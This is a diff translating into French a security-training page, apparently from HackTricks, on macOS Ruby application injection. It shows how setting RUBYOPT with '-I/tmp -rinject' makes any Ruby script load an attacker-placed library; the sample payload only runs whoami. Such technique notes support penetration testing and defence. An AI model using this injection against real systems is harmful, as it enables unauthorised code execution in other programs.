@@ -1,33 +1,25 @@
-# macOS Ruby Applications Injection
+# Injection d'applications Ruby sur macOS
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## RUBYOPT
 
-Using this env variable it's possible to **add new params** to **ruby** whenever it gets executed. Although the param **`-e`** cannot be used to specify ruby code to execute, it's possible to use the params **`-I`** and **`-r`** to add a new folder to the libraries to load path and then **specify a library to load**.
+En utilisant cette variable d'environnement, il est possible d'**ajouter de nouveaux paramètres** à **ruby** chaque fois qu'il est exécuté. Bien que le paramètre **`-e`** ne puisse pas être utilisé pour spécifier le code ruby à exécuter, il est possible d'utiliser les paramètres **`-I`** et **`-r`** pour ajouter un nouveau dossier au chemin de chargement des bibliothèques et ensuite **spécifier une bibliothèque à charger**.
 
-Create the library **`inject.rb`** in **`/tmp`**:
-
+Créez la bibliothèque **`inject.rb`** dans **`/tmp`** :
 ```ruby:inject.rb
 puts `whoami`
 ```
-
-Create anywahere a ruby script like:
-
+Créez n'importe où un script ruby comme :
 ```ruby:hello.rb
 puts 'Hello, World!'
 ```
-
-Then make an arbitrary ruby script load it with:
-
+Ensuite, faites charger un script ruby arbitraire avec :
 ```bash
 RUBYOPT="-I/tmp -rinject" ruby hello.rb
 ```
-
-Fun fact, it works even with param **`--disable-rubyopt`**:
-
+Fait amusant, cela fonctionne même avec le paramètre **`--disable-rubyopt`** :
 ```bash
 RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
 ```
-
 {{#include ../../../banners/hacktricks-training.md}}
